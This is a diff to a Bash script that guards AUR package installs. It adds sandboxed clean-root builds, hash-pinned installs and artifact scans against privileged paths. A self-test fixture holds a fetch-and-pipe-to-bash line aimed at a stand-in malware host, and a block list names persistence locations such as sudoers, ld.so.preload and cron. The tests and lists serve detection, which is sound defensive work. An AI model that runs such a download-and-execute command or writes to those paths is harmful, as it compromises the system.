@@ -1167,6 +1638,11 @@ _aur_guard_verify_package_recursive() {
 
   while IFS= read -r split_pkg; do
     [[ -n "$split_pkg" ]] || continue
+    _aur_guard_validate_package_name "$split_pkg" || {
+      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
+      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
+      return 1
+    }
     if ! _aur_guard_check_emergency_block "$split_pkg"; then
       _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
       _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
@@ -1176,7 +1652,17 @@ _aur_guard_verify_package_recursive() {
     _aur_guard_note_historical_match "$split_pkg"
   done < <(awk -F ' = ' '/^[[:space:]]*pkgname = / {print $2}' "$srcinfo")
 
-  _aur_guard_validate_source_origins "$pkgbase" "$srcinfo"
+  _aur_guard_validate_source_origins "$pkgbase" "$srcinfo" || {
+    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
+    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
+    return 1
+  }
+
+  _aur_guard_validate_skipped_integrity "$pkgbase" "$srcinfo" || {
+    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
+    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
+    return 1
+  }
 
   _aur_guard_prepare_public_keyring "$pkgdir" || {
     _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
@@ -1248,11 +1734,21 @@ _aur_guard_verify_package_recursive() {
     _aur_guard_fail "could not read AUR remote for $pkgbase"
     return 1
   }
+  _aur_guard_validate_official_remote "$pkgbase" "$remote" || {
+    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
+    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
+    return 1
+  }
 
   while IFS= read -r dep_spec; do
     [[ -n "$dep_spec" ]] || continue
     dep_name=$(_aur_guard_dependency_name "$dep_spec")
     [[ -n "$dep_name" ]] || continue
+    _aur_guard_validate_package_name "$dep_name" || {
+      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
+      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
+      return 1
+    }
 
     if ! _aur_guard_check_emergency_block "$dep_name"; then
       _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
@@ -1278,7 +1774,7 @@ _aur_guard_verify_package_recursive() {
       continue
     fi
 
-    if command pacman -Si "$dep_name" >/dev/null 2>&1; then
+    if _aur_guard_repo_package_satisfies "$dep_spec" "$dep_name"; then
       printf 'AUR Verify: %s dependency %s is available from an enabled repository.\n' \
         "$pkgbase" "$dep_name"
       _aur_guard_record_repo_dependency "$dep_name"
@@ -1336,34 +1832,79 @@ _aur_guard_verify_package_recursive() {
 }
 
 _aur_guard_recheck_commits() {
-  local pkgbase expected remote parent pkgdir current
+  local pkgbase expected remote parent pkgdir current temp
+
+  temp=$(mktemp -d) || return 1
 
   while IFS=$'\t' read -r pkgbase expected remote parent pkgdir; do
     [[ -n "$pkgbase" ]] || continue
-    current=$(command git ls-remote "$remote" HEAD 2>/dev/null | awk 'NR == 1 {print $1}')
+    _aur_guard_validate_official_remote "$pkgbase" "$remote" || {
+      rm -rf "$temp"
+      return 1
+    }
+
+    current=$(
+      _aur_guard_sandbox_exec "$temp" allow writable / \
+        /usr/bin/git ls-remote -- "$remote" HEAD 2>/dev/null \
+        | awk 'NR == 1 {print $1}'
+    )
 
     if [[ -z "$current" ]]; then
+      rm -rf "$temp"
       _aur_guard_fail "could not recheck current AUR commit for $pkgbase"
       return 1
     fi
 
     if [[ "$current" != "$expected" ]]; then
+      rm -rf "$temp"
       _aur_guard_fail "$pkgbase changed after verification"
       printf 'Verified: %s\nCurrent:  %s\n' "$expected" "$current" >&2
       return 1
     fi
   done < "$_AUR_GUARD_MANIFEST"
+
+  rm -rf "$temp"
 }
 
-_aur_guard_install_repo_dependencies() {
-  local -a packages=()
+_aur_guard_prepare_build_root() {
+  local build_root="$1"
+  local -a repo_packages=(base-devel)
+  local dep
 
-  [[ -s "$_AUR_GUARD_REPO_DEPS" ]] || return 0
-  mapfile -t packages < <(LC_ALL=C sort -u "$_AUR_GUARD_REPO_DEPS")
-  (( ${#packages[@]} > 0 )) || return 0
+  if [[ -s "$_AUR_GUARD_REPO_DEPS" ]]; then
+    while IFS= read -r dep; do
+      [[ -n "$dep" ]] && repo_packages+=("$dep")
+    done < <(LC_ALL=C sort -u "$_AUR_GUARD_REPO_DEPS")
+  fi
 
-  printf '\nAUR Guard: installing required repository build/runtime dependencies.\n'
-  sudo pacman -S --needed --asdeps "${packages[@]}"
+  sudo rm -rf -- "$build_root"
+  sudo mkdir -p -- "$(dirname -- "$build_root")" || return 1
+
+  printf 'AUR Guard: creating a disposable clean Arch build root.\n'
+  sudo mkarchroot "$build_root" "${repo_packages[@]}"
+}
+
+_aur_guard_install_prior_artifacts_into_root() {
+  local build_root="$1"
+  local pkgbase pkgname artifact hash
+  local copied_dir="$build_root/tmp/awtarchy-dependencies"
+  local -a copied=()
+
+  [[ -s "$_AUR_GUARD_ARTIFACTS" ]] || return 0
+
+  sudo install -d -m 0755 "$copied_dir" || return 1
+
+  while IFS=$'\t' read -r pkgbase pkgname artifact hash; do
+    [[ -n "$artifact" && -f "$artifact" ]] || continue
+    sudo install -m 0644 -- "$artifact" "$copied_dir/$(basename -- "$artifact")" || return 1
+    copied+=("/tmp/awtarchy-dependencies/$(basename -- "$artifact")")
+  done < "$_AUR_GUARD_ARTIFACTS"
+
+  (( ${#copied[@]} > 0 )) || return 0
+
+  sudo arch-nspawn "$build_root" \
+    --private-network \
+    /usr/bin/pacman -U --noconfirm --needed "${copied[@]}"
 }
 
 _aur_guard_artifact_name() {
@@ -1372,63 +1913,209 @@ _aur_guard_artifact_name() {
     | awk -F ' = ' '$1 == "pkgname" {print $2; exit}'
 }
 
+_aur_guard_artifact_path_is_blocked() {
+  local relative="$1"
+
+  case "$relative" in
+    .INSTALL|\
+    etc/sudoers|etc/sudoers.d/*|\
+    etc/pam.d/*|usr/lib/security/*|\
+    etc/ld.so.preload|etc/ld.so.conf.d/*|usr/lib/ld.so.conf.d/*|\
+    etc/profile|etc/profile.d/*|etc/bash.bashrc|\
+    etc/cron*|usr/lib/cron/*|usr/bin/crontab|\
+    etc/xdg/autostart/*|usr/share/autostart/*|\
+    usr/share/libalpm/hooks/*|\
+    usr/lib/systemd/system-preset/*|usr/lib/systemd/user-preset/*|\
+    usr/lib/systemd/system-generators/*|usr/lib/systemd/user-generators/*|\
+    usr/lib/systemd/system-environment-generators/*|usr/lib/systemd/user-environment-generators/*|\
+    usr/lib/tmpfiles.d/*|usr/lib/sysusers.d/*|\
+    usr/lib/udev/rules.d/*|etc/udev/rules.d/*|\
+    usr/share/polkit-1/rules.d/*|usr/share/polkit-1/actions/*|\
+    usr/share/dbus-1/system-services/*|usr/share/dbus-1/services/*|\
+    usr/lib/modules/*|usr/lib/modules-load.d/*|usr/lib/modprobe.d/*|\
+    usr/lib/sysctl.d/*|usr/lib/binfmt.d/*|usr/lib/environment.d/*)
+      return 0
+      ;;
+  esac
+
+  return 1
+}
+
 _aur_guard_scan_artifact() {
   local pkgbase="$1"
   local artifact="$2"
   local scan_root="$3"
-  local entry
+  local entry relative target resolved artifact_size file_count listing verbose_listing
+  local metadata pkgbase_metadata pkgname_metadata metadata_value duplicate_path
+  local copied_artifact="$scan_root/.artifact.pkg"
+
+  artifact_size=$(stat -c %s "$artifact" 2>/dev/null) || return 1
+  if (( artifact_size > _AUR_GUARD_ARTIFACT_MAX_BYTES )); then
+    _aur_guard_fail "$pkgbase produced an artifact larger than the configured limit"
+    return 1
+  fi
+
+  rm -rf "$scan_root"
+  mkdir -p "$scan_root" || return 1
+  listing="$scan_root/.archive-list"
+  verbose_listing="$scan_root/.archive-list-verbose"
+
+  if ! command bsdtar -tf "$artifact" > "$listing" \
+      || ! command bsdtar -tvf "$artifact" > "$verbose_listing"; then
+    _aur_guard_fail "$pkgbase produced an unreadable package archive"
+    return 1
+  fi
+
+  file_count=$(wc -l < "$listing") || return 1
+  if (( file_count > _AUR_GUARD_ARTIFACT_MAX_FILES )); then
+    _aur_guard_fail "$pkgbase produced an artifact containing too many archive entries"
+    return 1
+  fi
 
   while IFS= read -r entry; do
     case "$entry" in
-      /*|../*|*/../*)
+      /*|..|../*|*/../*|*/..)
         _aur_guard_fail "$pkgbase produced an archive with an unsafe path: $entry"
         return 1
         ;;
     esac
-  done < <(command bsdtar -tf "$artifact")
+  done < "$listing"
 
-  rm -rf "$scan_root"
-  mkdir -p "$scan_root" || return 1
+  for metadata in .PKGINFO .BUILDINFO .MTREE; do
+    if ! grep -Fxq -- "$metadata" "$listing"; then
+      _aur_guard_fail "$pkgbase produced an artifact without required package metadata: $metadata"
+      return 1
+    fi
+  done
 
-  if ! command timeout \
-      --foreground \
-      --kill-after="${_AUR_GUARD_SANDBOX_KILL_AFTER_SECONDS}s" \
-      "${_AUR_GUARD_SANDBOX_TIMEOUT_SECONDS}s" \
-      bwrap \
-        --die-with-parent \
-        --new-session \
-        --unshare-all \
-        --cap-drop ALL \
-        --ro-bind / / \
-        --dev /dev \
-        --proc /proc \
-        --tmpfs /tmp \
-        --ro-bind "$artifact" /artifact.pkg \
-        --bind "$scan_root" /scan \
-        --chdir /scan \
-        /usr/bin/bsdtar -xf /artifact.pkg; then
-    _aur_guard_fail "could not safely extract built artifact for inspection: $artifact"
+  duplicate_path=$(
+    sed -e 's#^\./##' -e 's#/*$##' "$listing" \
+      | awk 'NF && seen[$0]++ {print; exit}'
+  )
+  if [[ -n "$duplicate_path" ]]; then
+    _aur_guard_fail "$pkgbase produced an archive with a duplicate normalized path: $duplicate_path"
     return 1
   fi
 
-  if [[ -f "$scan_root/.INSTALL" ]] \
-      && /usr/bin/grep -HnEi \
-        "${_AUR_GUARD_HARD_BLOCK_RE}|${_AUR_GUARD_HOOK_BLOCK_RE}" \
-        "$scan_root/.INSTALL"; then
-    _aur_guard_fail "$pkgbase generated a package install script containing a blocked pattern"
+  pkgbase_metadata=$(
+    command bsdtar -xOf "$artifact" .PKGINFO 2>/dev/null \
+      | awk -F ' = ' '$1 == "pkgbase" {print $2; exit}'
+  )
+  pkgname_metadata=$(
+    command bsdtar -xOf "$artifact" .PKGINFO 2>/dev/null \
+      | awk -F ' = ' '$1 == "pkgname" {print $2; exit}'
+  )
+  if [[ -z "$pkgbase_metadata" || "$pkgbase_metadata" != "$pkgbase" ]]; then
+    _aur_guard_fail "$pkgbase produced an artifact claiming unexpected pkgbase: ${pkgbase_metadata:-missing}"
     return 1
+  fi
+  _aur_guard_validate_package_name "$pkgname_metadata" || return 1
+
+  while IFS= read -r metadata_value; do
+    [[ -n "$metadata_value" ]] || continue
+    _aur_guard_add_context_warning \
+      "$pkgname_metadata package replacement" \
+      "Built metadata declares replaces=$metadata_value; pacman may remove or supersede another package."
+  done < <(
+    command bsdtar -xOf "$artifact" .PKGINFO 2>/dev/null \
+      | awk -F ' = ' '$1 == "replaces" {print $2}'
+  )
+
+  while IFS= read -r metadata_value; do
+    [[ -n "$metadata_value" ]] || continue
+    _aur_guard_add_context_warning \
+      "$pkgname_metadata package conflict" \
+      "Built metadata declares conflict=$metadata_value; pacman may require removing a conflicting package."
+  done < <(
+    command bsdtar -xOf "$artifact" .PKGINFO 2>/dev/null \
+      | awk -F ' = ' '$1 == "conflict" {print $2}'
+  )
+
+  if grep -E ' (->|link to) (/|\.\./|.*(/\.\./|/\.\.$))' "$verbose_listing"; then
+    _aur_guard_fail "$pkgbase produced an archive with an unsafe symbolic-link or hard-link target"
+    return 1
+  fi
+
+  rm -f "$listing" "$verbose_listing"
+  ln "$artifact" "$copied_artifact" 2>/dev/null \
+    || cp --reflink=auto -- "$artifact" "$copied_artifact" \
+    || return 1
+
+  if ! _aur_guard_sandbox_exec \
+      "$scan_root" deny writable / \
+      /usr/bin/bsdtar -xf /work/.artifact.pkg -C /work; then
+    rm -f "$copied_artifact"
+    _aur_guard_fail "could not safely extract built artifact for inspection: $artifact"
+    return 1
+  fi
+  rm -f "$copied_artifact"
+
+  if [[ -e "$scan_root/.INSTALL" ]]; then
+    _aur_guard_fail "$pkgbase generated a pacman install script; root scriptlets are blocked by policy"
+    return 1
+  fi
+
+  while IFS= read -r -d '' entry; do
+    relative="${entry#"$scan_root"/}"
+    if _aur_guard_artifact_path_is_blocked "$relative"; then
+      _aur_guard_fail "$pkgbase installs a blocked privileged or auto-activation path: $relative"
+      return 1
+    fi
+  done < <(find -P "$scan_root" -mindepth 1 -print0)
+
+  if find -P "$scan_root" -xdev \( -type b -o -type c -o -type p -o -type s \) \
+      -print -quit | grep -q .; then
+    _aur_guard_fail "$pkgbase generated a device, FIFO, or socket entry"
+    return 1
+  fi
+
+  if find -P "$scan_root" -xdev -type f -perm /6000 -print -quit | grep -q .; then
+    _aur_guard_fail "$pkgbase generated a setuid or setgid file"
+    return 1
+  fi
+
+  while IFS= read -r -d '' entry; do
+    target=$(readlink -- "$entry") || return 1
+    case "$target" in
+      /*)
+        _aur_guard_fail "$pkgbase generated an absolute symbolic link: ${entry#"$scan_root"/} -> $target"
+        return 1
+        ;;
+    esac
+    resolved=$(realpath -m -- "$(dirname -- "$entry")/$target") || return 1
+    case "$resolved" in
+      "$scan_root"|"$scan_root"/*)
+        ;;
+      *)
+        _aur_guard_fail "$pkgbase generated a symbolic link escaping the package root: ${entry#"$scan_root"/} -> $target"
+        return 1
+        ;;
+    esac
+  done < <(find -P "$scan_root" -xdev -type l -print0)
+
+  if type -P getcap >/dev/null 2>&1; then
+    if command getcap -r "$scan_root" 2>/dev/null | grep -q .; then
+      command getcap -r "$scan_root" 2>/dev/null >&2 || true
+      _aur_guard_fail "$pkgbase generated files with Linux capabilities"
+      return 1
+    fi
+  fi
+
+  if type -P clamscan >/dev/null 2>&1; then
+    if ! command clamscan --infected --recursive --no-summary "$scan_root"; then
+      _aur_guard_fail "$pkgbase artifact failed the optional ClamAV scan"
+      return 1
+    fi
   fi
 
   _aur_guard_scan_source_tree "$pkgbase built artifact" "$scan_root" recursive
 }
 
-_aur_guard_build_and_install_verified() {
+_aur_guard_build_verified_artifacts() {
   local requested_pkg="$1"
-  local pkgbase expected remote parent pkgdir
-  local required required_base required_name pkgname artifact scan_root
+  local pkgbase expected remote parent pkgdir build_root
+  local required required_base required_name pkgname artifact scan_root hash
   local -a artifacts=()
-  local -a dependency_artifacts=()
-  local -a requested_artifacts=()
 
   while IFS=$'\t' read -r pkgbase expected remote parent pkgdir; do
     [[ -n "$pkgbase" && -d "$pkgdir" ]] || {
@@ -1436,41 +2123,72 @@ _aur_guard_build_and_install_verified() {
       return 1
     }
 
-    printf '
-AUR Guard: preparing dependency caches for %s from verified commit %s inside a restricted network sandbox.
-' \
+    build_root="$_AUR_GUARD_WORK_DIR/build-roots/${pkgbase//[^a-zA-Z0-9._+-]/_}"
+    _aur_guard_prepare_build_root "$build_root" || {
+      _aur_guard_fail "$pkgbase clean build-root creation failed"
+      return 1
+    }
+
+    _aur_guard_install_prior_artifacts_into_root "$build_root" || {
+      sudo rm -rf -- "$build_root"
+      _aur_guard_fail "$pkgbase could not install previously verified AUR dependencies into its disposable build root"
+      return 1
+    }
+
+    printf '\nAUR Guard: preparing %s from verified commit %s inside a disposable public-network sandbox.\n' \
       "$pkgbase" "${expected:0:12}"
 
     rm -rf "$pkgdir/.awtarchy-build" "$pkgdir/.awtarchy-pkg" \
       "$pkgdir/.awtarchy-log" "$pkgdir/.awtarchy-artifact-scan"
     mkdir -p "$pkgdir/.awtarchy-build" "$pkgdir/.awtarchy-pkg" \
-      "$pkgdir/.awtarchy-log" "$pkgdir/.awtarchy-artifact-scan" || return 1
+      "$pkgdir/.awtarchy-log" "$pkgdir/.awtarchy-artifact-scan" || {
+      sudo rm -rf -- "$build_root"
+      return 1
+    }
 
+    _AUR_GUARD_SANDBOX_ROOTFS="$build_root"
     if ! _aur_guard_makepkg_sandbox "$pkgdir" allow writable \
         --nobuild --noverify --holdver --noconfirm --nocolor; then
-      _aur_guard_fail "$pkgbase failed its sandboxed source preparation step"
+      unset _AUR_GUARD_SANDBOX_ROOTFS
+      sudo rm -rf -- "$build_root"
+      _aur_guard_fail "$pkgbase failed its isolated network preparation step"
       return 1
     fi
 
-    _aur_guard_assert_tracked_files_unchanged "$pkgbase" "$pkgdir" || return 1
+    _aur_guard_assert_tracked_files_unchanged "$pkgbase" "$pkgdir" || {
+      unset _AUR_GUARD_SANDBOX_ROOTFS
+      sudo rm -rf -- "$build_root"
+      return 1
+    }
 
     _aur_guard_scan_source_tree \
       "$pkgbase prepared source tree" \
-      "$pkgdir/.awtarchy-build" recursive || return 1
+      "$pkgdir/.awtarchy-build" recursive || {
+      unset _AUR_GUARD_SANDBOX_ROOTFS
+      sudo rm -rf -- "$build_root"
+      return 1
+    }
 
     _aur_guard_scan_source_tree \
       "$pkgbase downloaded dependency cache" \
-      "$pkgdir/.awtarchy-cache" recursive || return 1
+      "$pkgdir/.awtarchy-cache" recursive || {
+      unset _AUR_GUARD_SANDBOX_ROOTFS
+      sudo rm -rf -- "$build_root"
+      return 1
+    }
 
-    printf 'AUR Guard: running prepare(), build(), check(), and package() for %s offline.
-' \
+    printf 'AUR Guard: running build(), check(), and package() for %s with no network.\n' \
       "$pkgbase"
 
     if ! _aur_guard_makepkg_sandbox "$pkgdir" deny writable \
-        --cleanbuild --holdver --check --noconfirm --nocolor; then
-      _aur_guard_fail "$pkgbase failed its offline prepare/build/check/package test"
+        --noextract --noprepare --noverify --holdver --check --noconfirm --nocolor; then
+      unset _AUR_GUARD_SANDBOX_ROOTFS
+      sudo rm -rf -- "$build_root"
+      _aur_guard_fail "$pkgbase failed its offline clean-root build/check/package step"
       return 1
     fi
+    unset _AUR_GUARD_SANDBOX_ROOTFS
+    sudo rm -rf -- "$build_root"
 
     _aur_guard_assert_tracked_files_unchanged "$pkgbase" "$pkgdir" || return 1
 
@@ -1495,15 +2213,13 @@ AUR Guard: preparing dependency caches for %s from verified commit %s inside a r
       return 1
     fi
 
-    dependency_artifacts=()
-    requested_artifacts=()
-
     for artifact in "${artifacts[@]}"; do
       pkgname=$(_aur_guard_artifact_name "$artifact")
       [[ -n "$pkgname" ]] || {
         _aur_guard_fail "could not read package name from artifact: $artifact"
         return 1
       }
+      _aur_guard_validate_package_name "$pkgname" || return 1
 
       scan_root="$pkgdir/.awtarchy-artifact-scan/${pkgname//[^a-zA-Z0-9._+-]/_}"
       _aur_guard_scan_artifact "$pkgbase" "$artifact" "$scan_root" || return 1
@@ -1518,14 +2234,15 @@ AUR Guard: preparing dependency caches for %s from verified commit %s inside a r
 
       $required || continue
 
-      printf '%s\t%s\t%s\n' "$pkgbase" "$pkgname" "$artifact" \
-        >> "$_AUR_GUARD_ARTIFACTS"
-
-      if [[ "$pkgname" == "$requested_pkg" ]]; then
-        requested_artifacts+=("$artifact")
-      else
-        dependency_artifacts+=("$artifact")
+      if awk -F '\t' -v n="$pkgname" '$2 == n {found=1} END {exit !found}' \
+          "$_AUR_GUARD_ARTIFACTS"; then
+        _aur_guard_fail "multiple verified artifacts claim the same package name: $pkgname"
+        return 1
       fi
+
+      hash=$(sha256sum -- "$artifact" | awk '{print $1}') || return 1
+      printf '%s\t%s\t%s\t%s\n' "$pkgbase" "$pkgname" "$artifact" "$hash" \
+        >> "$_AUR_GUARD_ARTIFACTS"
     done
 
     while IFS=$'\t' read -r required_base required_name; do
@@ -1537,16 +2254,6 @@ AUR Guard: preparing dependency caches for %s from verified commit %s inside a r
         return 1
       fi
     done < "$_AUR_GUARD_REQUIRED_PACKAGES"
-
-    if (( ${#dependency_artifacts[@]} > 0 )); then
-      printf 'AUR Guard: installing verified dependency artifacts from %s.\n' "$pkgbase"
-      sudo pacman -U --needed --asdeps "${dependency_artifacts[@]}" || return 1
-    fi
-
-    if (( ${#requested_artifacts[@]} > 0 )); then
-      printf 'AUR Guard: installing verified requested artifact from %s.\n' "$pkgbase"
-      sudo pacman -U --needed "${requested_artifacts[@]}" || return 1
-    fi
   done < "$_AUR_GUARD_MANIFEST"
 
   if ! awk -F '\t' -v n="$requested_pkg" \
@@ -1554,6 +2261,58 @@ AUR Guard: preparing dependency caches for %s from verified commit %s inside a r
     _aur_guard_fail "no verified artifact was produced for requested package $requested_pkg"
     return 1
   fi
+}
+
+_aur_guard_verify_artifact_hashes() {
+  local pkgbase pkgname artifact expected actual
+
+  while IFS=$'\t' read -r pkgbase pkgname artifact expected; do
+    [[ -f "$artifact" ]] || {
+      _aur_guard_fail "verified artifact disappeared before installation: $artifact"
+      return 1
+    }
+    actual=$(sha256sum -- "$artifact" | awk '{print $1}') || return 1
+    if [[ "$actual" != "$expected" ]]; then
+      _aur_guard_fail "verified artifact changed before installation: $artifact"
+      return 1
+    fi
+  done < "$_AUR_GUARD_ARTIFACTS"
+}
+
+_aur_guard_install_verified_transaction() {
+  local requested_pkg="$1"
+  local pkgbase pkgname artifact hash reason
+  local -a artifacts=()
+  local -a mark_asdeps=()
+
+  _aur_guard_verify_artifact_hashes || return 1
+
+  while IFS=$'\t' read -r pkgbase pkgname artifact hash; do
+    [[ -n "$artifact" ]] || continue
+    artifacts+=("$artifact")
+
+    if [[ "$pkgname" != "$requested_pkg" ]]; then
+      reason=$(command pacman -Qi "$pkgname" 2>/dev/null \
+        | awk -F ': ' '/^Install Reason/ {print $2; exit}')
+      if [[ "$reason" != 'Explicitly installed' ]]; then
+        mark_asdeps+=("$pkgname")
+      fi
+    fi
+  done < "$_AUR_GUARD_ARTIFACTS"
+
+  (( ${#artifacts[@]} > 0 )) || return 1
+  _aur_guard_verify_artifact_hashes || return 1
+  _AUR_GUARD_INSTALL_STARTED=1
+
+  printf '\nAUR Guard: installing every verified AUR artifact and required repository dependency in one pacman transaction.\n'
+  if ! sudo pacman -U --needed "${artifacts[@]}"; then
+    return 1
+  fi
+
+  if (( ${#mark_asdeps[@]} > 0 )); then
+    sudo pacman -D --asdeps "${mark_asdeps[@]}" || return 1
+  fi
+  sudo pacman -D --asexplicit "$requested_pkg" || return 1
 }
 
 _aur_guard_verify_tree() {
@@ -1573,6 +2332,27 @@ _aur_guard_verify_tree() {
     _aur_guard_fail 'bubblewrap is required. Install it with: sudo pacman -S bubblewrap'
     return 127
   }
+
+  type -P systemd-run >/dev/null 2>&1 || {
+    _aur_guard_fail 'systemd-run is required for cgroup resource and network filtering'
+    return 127
+  }
+
+  type -P pasta >/dev/null 2>&1 || {
+    _aur_guard_fail 'pasta from passt is required for an isolated network namespace. Install it with: sudo pacman -S passt'
+    return 127
+  }
+
+  type -P mkarchroot >/dev/null 2>&1 || {
+    _aur_guard_fail 'mkarchroot from devtools is required. Install it with: sudo pacman -S devtools'
+    return 127
+  }
+
+  type -P arch-nspawn >/dev/null 2>&1 || {
+    _aur_guard_fail 'arch-nspawn from devtools is required. Install it with: sudo pacman -S devtools'
+    return 127
+  }
+
 
   type -P timeout >/dev/null 2>&1 || {
     _aur_guard_fail 'timeout from coreutils is required'
@@ -1599,10 +2379,35 @@ _aur_guard_verify_tree() {
     return 127
   fi
 
-  _AUR_GUARD_HELPER=$(_aur_guard_pick_helper) || {
-    _aur_guard_fail 'no yay or paru found'
-    return 127
-  }
+  if [[ ${AUR_GUARD_TEST_MODE:-0} != 1 ]]; then
+    if ! command systemd-run --user --wait --pipe --collect --quiet \
+        --property=Type=exec \
+        --property=IPAddressDeny=any \
+        /usr/bin/true >/dev/null 2>&1; then
+      _aur_guard_fail 'the per-user systemd manager cannot enforce cgroup IP filtering for transient sandbox services'
+      return 1
+    fi
+
+    if type -P curl >/dev/null 2>&1; then
+      if command systemd-run --user --wait --pipe --collect --quiet \
+          --property=Type=exec \
+          --property=IPAddressDeny=any \
+          /usr/bin/curl --fail --silent --show-error --max-time 5 \
+          "$_AUR_GUARD_NETWORK_TEST_URL" >/dev/null 2>&1; then
+        _aur_guard_fail 'systemd cgroup IP filtering is unavailable or ineffective; refusing a network-enabled AUR sandbox'
+        return 1
+      fi
+    else
+      if command systemd-run --user --wait --pipe --collect --quiet \
+          --property=Type=exec \
+          --property=IPAddressDeny=any \
+          /usr/bin/wget --quiet --timeout=5 --output-document=/dev/null \
+          "$_AUR_GUARD_NETWORK_TEST_URL" >/dev/null 2>&1; then
+        _aur_guard_fail 'systemd cgroup IP filtering is unavailable or ineffective; refusing a network-enabled AUR sandbox'
+        return 1
+      fi
+    fi
+  fi
 
   _aur_guard_refresh_blacklists || return 1
 
@@ -1620,6 +2425,7 @@ _aur_guard_verify_tree() {
   declare -gA _AUR_GUARD_BASE_STATE=()
   _AUR_GUARD_HISTORICAL_MATCHES=()
   _AUR_GUARD_CONTEXT_WARNINGS=()
+  _AUR_GUARD_INSTALL_STARTED=0
 
   printf 'AUR Verify: recursively checking %s and all required AUR dependencies.\n' "$pkg"
   _aur_guard_verify_package_recursive "$pkg" '(requested)' || return 1
@@ -1634,10 +2440,14 @@ _aur_guard_verify_tree() {
 }
 
 _aur_guard_cleanup_work() {
+  if [[ -n ${_AUR_GUARD_WORK_DIR:-} && -d $_AUR_GUARD_WORK_DIR/build-roots ]]; then
+    sudo rm -rf -- "$_AUR_GUARD_WORK_DIR/build-roots" 2>/dev/null || true
+  fi
   if [[ -n ${_AUR_GUARD_WORK_DIR:-} && -d $_AUR_GUARD_WORK_DIR ]]; then
     rm -rf "$_AUR_GUARD_WORK_DIR"
   fi
   unset _AUR_GUARD_WORK_DIR _AUR_GUARD_MANIFEST _AUR_GUARD_HELPER
+  unset _AUR_GUARD_SANDBOX_ROOTFS _AUR_GUARD_INSTALL_STARTED
   unset _AUR_GUARD_REQUIRED_PACKAGES _AUR_GUARD_REPO_DEPS _AUR_GUARD_ARTIFACTS
   unset _AUR_GUARD_REQUEST_STATE _AUR_GUARD_BASE_STATE
   _AUR_GUARD_HISTORICAL_MATCHES=()
@@ -1658,7 +2468,7 @@ aurguardtest() (
   historical_output="$test_root/historical-output.log"
   mkdir -p "$test_bin" "$test_root/cache"
 
-  for tool in makepkg git jq bwrap gpg timeout bsdtar; do
+  for tool in makepkg git jq bwrap gpg timeout bsdtar systemd-run pasta mkarchroot arch-nspawn sha256sum realpath; do
     printf '%s\n' '#!/bin/sh' 'exit 0' > "$test_bin/$tool"
   done
 
@@ -1676,10 +2486,12 @@ printf '%s\n' "$*" >> "${AUR_GUARD_TEST_HELPER_LOG:?}"
 exit 99
 AUR_GUARD_TEST_HELPER
 
+  cp "$test_bin/yay" "$test_bin/paru"
   chmod 0755 "$test_bin"/*
 
   export AUR_GUARD_TEST_HELPER_LOG="$helper_log"
   export AUR_GUARD_TEST_NETWORK_LOG="$network_log"
+  export AUR_GUARD_TEST_MODE=1
   PATH="$test_bin:$PATH"
   export PATH
 
@@ -1800,6 +2612,59 @@ AUR_GUARD_TEST_HELPER
     return 1
   fi
 
+  local direct_command
+  for direct_command in \
+      'yay -Qm' \
+      'yay -G example' \
+      'yay -Ss example' \
+      'yay --version' \
+      'paru -Qm' \
+      'paru --version'; do
+    if wrapper_output=$(eval "$direct_command" 2>&1); then
+      printf '%s\n' "$wrapper_output"
+      _aur_guard_fail "self-test failed: direct helper command returned success: $direct_command"
+      return 1
+    fi
+  done
+
+  if [[ -s "$helper_log" ]]; then
+    _aur_guard_fail 'self-test failed: a direct yay/paru command reached the external helper'
+    return 1
+  fi
+
+  if _aur_guard_validate_package_name '--config'; then
+    _aur_guard_fail 'self-test failed: option-shaped package name passed validation'
+    return 1
+  fi
+
+  printf '\nAUR Guard self-test: remote sources require strong immutable integrity.\n'
+  cat > "$test_root/weak-integrity.SRCINFO" <<'AUR_GUARD_TEST_WEAK_INTEGRITY'
+pkgbase = weak-integrity
+	pkgname = weak-integrity
+	source = https://example.invalid/source.tar.gz
+	md5sums = d41d8cd98f00b204e9800998ecf8427e
+AUR_GUARD_TEST_WEAK_INTEGRITY
+  if _aur_guard_validate_skipped_integrity \
+      'weak-integrity' "$test_root/weak-integrity.SRCINFO"; then
+    _aur_guard_fail 'self-test failed: weak remote-source integrity was accepted'
+    return 1
+  fi
+
+  cat > "$test_root/pgp-integrity.SRCINFO" <<'AUR_GUARD_TEST_PGP_INTEGRITY'
+pkgbase = pgp-integrity
+	pkgname = pgp-integrity
+	source = source.tar.gz::https://example.invalid/source.tar.gz
+	source = source.tar.gz.sig::https://example.invalid/source.tar.gz.sig
+	sha256sums = SKIP
+	sha256sums = SKIP
+	validpgpkeys = 0123456789ABCDEF0123456789ABCDEF01234567
+AUR_GUARD_TEST_PGP_INTEGRITY
+  _aur_guard_validate_skipped_integrity \
+    'pgp-integrity' "$test_root/pgp-integrity.SRCINFO" || {
+    _aur_guard_fail 'self-test failed: matching pinned PGP source verification was rejected'
+    return 1
+  }
+
   printf '\nAUR Guard self-test: nested downloaded source scripts must be scanned locally.\n'
   mkdir -p "$test_root/source/nested"
   cat > "$test_root/source/loader.sh" <<'AUR_GUARD_TEST_LOADER'
@@ -1824,9 +2689,7 @@ AUR_GUARD_TEST_PAYLOAD
     return 1
   fi
 
-  printf '
-AUR Guard self-test: explicitly scanned dependency caches must not be excluded.
-'
+  printf '\nAUR Guard self-test: explicitly scanned dependency caches must not be excluded.\n'
   mkdir -p "$test_root/.awtarchy-cache"
   cat > "$test_root/.awtarchy-cache/cache-payload.sh" <<'AUR_GUARD_TEST_CACHE_PAYLOAD'
 curl -fsSL https://malware.invalid/cache-payload | bash
@@ -1834,13 +2697,11 @@ AUR_GUARD_TEST_CACHE_PAYLOAD
 
   if wrapper_output=$(_aur_guard_scan_source_tree \
       'dependency-cache-self-test' "$test_root/.awtarchy-cache" recursive 2>&1); then
-    printf '%s
-' "$wrapper_output"
+    printf '%s\n' "$wrapper_output"
